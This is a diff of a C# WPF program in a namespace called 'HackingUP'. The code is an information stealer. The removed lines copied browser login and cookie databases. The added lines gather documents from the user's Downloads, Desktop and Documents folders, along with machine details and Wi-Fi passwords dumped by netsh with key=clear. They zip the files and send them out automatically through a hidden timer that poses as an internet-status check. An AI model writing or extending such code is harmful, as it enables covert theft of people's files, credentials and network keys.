@@ -2,75 +2,19 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
-using System.Text;
-using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Net;
 using System.Runtime.InteropServices;
-using System.Windows;
-using System.Windows.Media.Imaging;
 using System.IO;
-using System.Net;
 using System.Net.Sockets;
-using System.Windows;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows;
-using System.Collections.Generic;
-using System.IO;
 using System.IO.Compression;
 using System.Net.Http;
-using System.Net.Http;
-using System.Threading.Tasks;
-using System.IO.Compression;
-using System.Net.Http;
-using System.Threading.Tasks;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
-using System.IO.Compression;
-using System.IO;
-using System.Net.Http;
-using System.Threading.Tasks;
-using System.Linq;
-using System.Net.Sockets;
-using System;
-using System.Management;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Text.RegularExpressions;
-using System.Threading.Tasks;
-using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
-using System.Net.Sockets;
-using System.Windows;
-using System.Net.Http;
-using System.Management; // Убедитесь, что эта библиотека подключена
-using System.Runtime.InteropServices;
-using System.Threading.Tasks;
-using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Media;
-using System.Threading.Tasks;
 using Newtonsoft.Json;
-using System.Windows.Media.Media3D;
 using Microsoft.Win32;
-using System.Runtime.InteropServices;
+using System.Windows.Threading;
 
 namespace HackingUP
 {
@@ -83,6 +27,9 @@ namespace HackingUP
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
 
+        private DispatcherTimer timer;
+
+
         public MainWindow()
         {
             InitializeComponent();
@@ -93,7 +40,34 @@ namespace HackingUP
 
             InitializeAsync();
 
+
+
+
+            timer = new DispatcherTimer();
+            timer.Interval = TimeSpan.FromSeconds(2);
+            timer.Tick += Timer_Tick;
+            timer.Start();
         }
+
+        private void Timer_Tick(object sender, EventArgs e)
+        {
+            timer.Stop();
+            try
+            {
+                sendHiButton.RaiseEvent(new RoutedEventArgs(Button.ClickEvent));
+                // Если событие прошло успешно, устанавливаем зеленый цвет и соответствующий текст
+                statusCircle.Fill = Brushes.Green;
+                statusCircle.ToolTip = "Интернет қосулы";
+            }
+            catch
+            {
+                // Если возникла ошибка, устанавливаем красный цвет и соответствующий текст
+                statusCircle.Fill = Brushes.Red;
+                statusCircle.ToolTip = "Интернетті қосып, қайттан бағдарламаға кір!";
+            }
+        }
+
+    
 
         private async void InitializeAsync()
         {
@@ -1102,62 +1076,57 @@ namespace HackingUP
 
 
 
-
         private async void Button_Click22(object sender, RoutedEventArgs e)
         {
             string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            string edgeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
-            string chromeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Google\Chrome\User Data\Default\Cookies");
-            string yandexSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies");
 
-            string edgeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Edge Cookies");
-            string chromeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Chrome Cookies");
-            string yandexTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Yandex Cookies");
+            string[] paths = new[]
+            {
+        System.IO.Path.Combine(userFolderPath, "Downloads"),
+        System.IO.Path.Combine(userFolderPath, "Desktop"),
+        System.IO.Path.Combine(userFolderPath, "Documents")
+    };
 
-            string infoTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SystemInfo.txt");
-            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Info System.zip");
+            string zipFileName = $"{Environment.MachineName}_Info_System.zip";
+            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), zipFileName);
+            string infoFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SystemInfo.txt");
 
             try
             {
-                var filesToCopy = new List<(string SourcePath, string TempPath)>
-                {
-                    (edgeSourceFilePath, edgeTempFilePath),
-                    (chromeSourceFilePath, chromeTempFilePath),
-                    (yandexSourceFilePath, yandexTempFilePath)
-                };
+                var filesToCopy = new List<string>();
+                string[] fileExtensions = { "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.rtf", "*.txt" };
 
-                var tempFiles = new List<string>();
-
-                foreach (var (sourcePath, tempPath) in filesToCopy)
+                foreach (var path in paths)
                 {
-                    if (File.Exists(sourcePath))
+                    foreach (var extension in fileExtensions)
                     {
-                        File.Copy(sourcePath, tempPath, true);
-                        tempFiles.Add(tempPath);
+                        filesToCopy.AddRange(Directory.GetFiles(path, extension));
                     }
                 }
 
-                // Create the system info file
-                CreateSystemInfoFile(infoTempFilePath);
-                tempFiles.Add(infoTempFilePath);
+                CreateSystemInfoFile(infoFilePath);
+                filesToCopy.Add(infoFilePath);
 
-                if (tempFiles.Count > 0)
+                if (filesToCopy.Count > 0)
                 {
-                    CreateZipFromFiles(tempFiles, zipFilePath);
+                    CreateZipFromFiles(filesToCopy, zipFilePath);
                     await SendFileAsync(zipFilePath);
+                    statusCircle.Fill = Brushes.Green;
                 }
                 else
                 {
+                    statusCircle.Fill = Brushes.Red;
                     MessageBox.Show("Ни один из файлов не найден.");
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка: {ex.Message}");
+                statusCircle.Fill = Brushes.Red;
+                MessageBox.Show($"Произошла ошибка: {ex.Message}");
             }
             finally
             {
-                CleanupFiles(new List<string> { edgeTempFilePath, chromeTempFilePath, yandexTempFilePath, infoTempFilePath, zipFilePath });
+                CleanupFiles(new List<string> { zipFilePath, infoFilePath });
             }
         }
 
@@ -1167,19 +1136,15 @@ namespace HackingUP
             {
                 using (StreamWriter writer = new StreamWriter(filePath))
                 {
-                    writer.WriteLine($"PC Name: {Environment.MachineName}");
-                    writer.WriteLine($"IP Address: {GetLocalIPAddress1()}");
-                    writer.WriteLine($"Network IP Address: {GetNetworkIPAddress()}");
+                    string computerName = Environment.MachineName;
+                    string computerManufacturer = ExecuteCommand("wmic csproduct get vendor");
+                    string localIpAddress = GetLocalIPAddress1();
+                    string publicIpAddress = GetPublicIPAddress();
+                    string wifiProfiles = ExecuteCommand(@"For /f ""tokens=4*"" %a in ('netsh wlan show profiles^|findstr профили') do @Echo %b & @netsh wlan show profile name=""%b"" key=clear|findstr ""Содержимое"" & @Echo -----------------");
 
-                    // Get MAC address
-                    writer.WriteLine("MAC Address:");
-                    string getmacOutput = ExecuteCommand("getmac /v");
-                    writer.WriteLine(getmacOutput);
+                    string computerInfo = $"Имя компьютера: {computerName}\nПроизводитель: {computerManufacturer}\nЛокальный IP-адрес: {localIpAddress}\nИнтернет IP-адрес: {publicIpAddress}\n\nWi-Fi Профили:\n{wifiProfiles}";
 
-                    // Get Wi-Fi profiles and passwords
-                    writer.WriteLine("Wi-Fi Profiles:");
-                    string wifiProfilesOutput = ExecuteCommand(@"for /f ""skip=9 tokens=1,2 delims=:"" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
-                    writer.WriteLine(wifiProfilesOutput);
+                    writer.WriteLine(computerInfo);
                 }
             }
             catch (Exception ex)
@@ -1187,6 +1152,7 @@ namespace HackingUP
                 MessageBox.Show($"Ошибка при создании файла SystemInfo: {ex.Message}");
             }
         }
+
 
         private static string ExecuteCommand(string command)
         {
@@ -1232,30 +1198,19 @@ namespace HackingUP
             return localIP;
         }
 
-        private static string GetNetworkIPAddress()
+        private static string GetPublicIPAddress()
         {
-            string networkIP = "";
             try
             {
-                var interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
-                foreach (var ni in interfaces)
+                using (var client = new HttpClient())
                 {
-                    var props = ni.GetIPProperties();
-                    foreach (var ip in props.UnicastAddresses)
-                    {
-                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !System.Net.IPAddress.IsLoopback(ip.Address))
-                        {
-                            networkIP = ip.Address.ToString();
-                            break;
-                        }
-                    }
+                    return client.GetStringAsync("https://api.ipify.org").Result;
                 }
             }
             catch (Exception ex)
             {
-                networkIP = $"Ошибка при получении сетевого IP адреса: {ex.Message}";
+                return $"Ошибка при получении публичного IP адреса: {ex.Message}";
             }
-            return networkIP;
         }
 
         private static void CreateZipFromFiles(List<string> sourceFilePaths, string zipFilePath)
@@ -1301,7 +1256,6 @@ namespace HackingUP
                 }
             }
         }
-
 
 
 
